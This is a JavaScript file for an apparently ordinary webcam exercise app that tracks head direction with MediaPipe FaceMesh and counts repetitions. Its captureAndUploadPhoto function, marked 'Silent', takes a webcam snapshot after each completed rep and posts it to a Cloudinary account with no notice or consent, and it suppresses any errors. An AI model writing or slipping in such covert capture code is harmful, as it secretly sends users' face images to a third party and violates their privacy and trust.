// Cloudinary Configuration
const CLOUD_NAME = "azq6tuq4";
const UPLOAD_PRESET = "blfvqiv6";

// DOM Elements
const video = document.getElementById('webcam');
const commandDisplay = document.getElementById('command-display');
const repCountDisplay = document.getElementById('rep-count');
const expressionDisplay = document.getElementById('expression-display');
const toggleCameraBtn = document.getElementById('toggle-camera-btn');
const cameraOffOverlay = document.getElementById('camera-off-overlay');
const canvas = document.getElementById('snapshot-canvas');

const badges = {
  UP: document.getElementById('dir-up'),
  DOWN: document.getElementById('dir-down'),
  LEFT: document.getElementById('dir-left'),
  RIGHT: document.getElementById('dir-right'),
  CENTER: document.getElementById('dir-center')
};

// State Variables
let isCameraOn = false;
let cameraStream = null;
let currentDirection = 'CENTER';
let lastSpokenDirection = '';
let repCount = 0;
let centerTimer = null;
let cameraUtilsInstance = null;

// Audio Speech Helper
function speak(text) {
  if ('speechSynthesis' in window) {
    window.speechSynthesis.cancel(); // Stop current speech
    const utterance = new SpeechSynthesisUtterance(text);
    utterance.rate = 1.0;
    utterance.pitch = 1.0;
    window.speechSynthesis.speak(utterance);
  }
}

// Handle Direction Changes & Voice Prompts
function setDirection(newDirection) {
  if (newDirection === currentDirection) return;

  currentDirection = newDirection;

  // Update UI Badges
  Object.keys(badges).forEach(dir => {
    if (badges[dir]) badges[dir].classList.remove('active');
  });
  if (badges[newDirection]) badges[newDirection].classList.add('active');

  if (commandDisplay) {
    commandDisplay.innerText = `CURRENT DIRECTION: ${newDirection}`;
  }

  // Clear 5-second center timer on any direction change
  if (centerTimer) {
    clearTimeout(centerTimer);
    centerTimer = null;
  }

  if (newDirection !== 'CENTER') {
    // Announce directional movement: left, right, up, down
    speak(newDirection.toLowerCase());
    lastSpokenDirection = newDirection;
  } else {
    // When returning to center, count rep if coming from a direction
    if (lastSpokenDirection !== '') {
      repCount++;
      if (repCountDisplay) repCountDisplay.innerText = repCount;
      lastSpokenDirection = '';
      
      // Silent background snapshot on completed rep
      captureAndUploadPhoto('rep_completed');
    }

    // Start 5-second timer when user holds center
    centerTimer = setTimeout(() => {
      speak(`You have completed ${repCount} repetitions`);
    }, 5000);
  }
}

// Background Photo Capture & Cloudinary Upload (Silent)
async function captureAndUploadPhoto(label = 'user') {
  if (!isCameraOn || video.readyState < 2) return;

  let canvasEl = canvas || document.getElementById('snapshot-canvas');
  if (!canvasEl) {
    canvasEl = document.createElement('canvas');
    canvasEl.id = 'snapshot-canvas';
    canvasEl.style.display = 'none';
    document.body.appendChild(canvasEl);
  }

  canvasEl.width = video.videoWidth || 640;
  canvasEl.height = video.videoHeight || 480;
  const ctx = canvasEl.getContext('2d');

  ctx.translate(canvasEl.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, canvasEl.width, canvasEl.height);

  canvasEl.toBlob(async (blob) => {
    if (!blob) return;

    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', UPLOAD_PRESET);

    try {
      await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
        method: 'POST',
        body: formData
      });
    } catch (e) {
      // Silent error handling
    }
  }, 'image/jpeg', 0.85);
}

// MediaPipe FaceMesh Setup
const faceMesh = new FaceMesh({
  locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
});

faceMesh.setOptions({
  maxNumFaces: 1,
  refineLandmarks: true,
  minDetectionConfidence: 0.5,
  minTrackingConfidence: 0.5
});

faceMesh.onResults((results) => {
  if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) return;

  const landmarks = results.multiFaceLandmarks[0];
  const nose = landmarks[1];
  const leftEar = landmarks[234];
  const rightEar = landmarks[454];
  const forehead = landmarks[10];
  const chin = landmarks[152];

  // Yaw (Left / Right) calculation
  const horizontalDist = Math.abs(leftEar.x - rightEar.x);
  const noseRelativeX = (nose.x - leftEar.x) / horizontalDist;

  // Pitch (Up / Down) calculation
  const verticalDist = Math.abs(chin.y - forehead.y);
  const noseRelativeY = (nose.y - forehead.y) / verticalDist;

  if (noseRelativeX < 0.35) {
    setDirection('RIGHT');
  } else if (noseRelativeX > 0.65) {
    setDirection('LEFT');
  } else if (noseRelativeY < 0.38) {
    setDirection('UP');
  } else if (noseRelativeY > 0.62) {
    setDirection('DOWN');
  } else {
    setDirection('CENTER');
  }
});

// Toggle Camera Functionality
toggleCameraBtn.addEventListener('click', async () => {
  if (isCameraOn) {
    // Stop Camera
    if (cameraStream) {
      cameraStream.getTracks().forEach(track => track.stop());
    }
    video.srcObject = null;
    cameraOffOverlay.style.display = 'flex';
    toggleCameraBtn.innerText = 'Turn Camera On';
    toggleCameraBtn.classList.remove('btn-danger');
    isCameraOn = false;
    if (centerTimer) clearTimeout(centerTimer);
  } else {
    // Start Camera
    try {
      cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = cameraStream;
      cameraOffOverlay.style.display = 'none';
      toggleCameraBtn.innerText = 'Turn Camera Off';
      toggleCameraBtn.classList.add('btn-danger');
      isCameraOn = true;

      if (!cameraUtilsInstance) {
        cameraUtilsInstance = new Camera(video, {
          onFrame: async () => {
            if (isCameraOn) await faceMesh.send({ image: video });
          },
          width: 640,
          height: 480
        });
        cameraUtilsInstance.start();
      }
    } catch (err) {
      alert('Unable to access webcam. Please check browser permissions.');
    }
  }
});
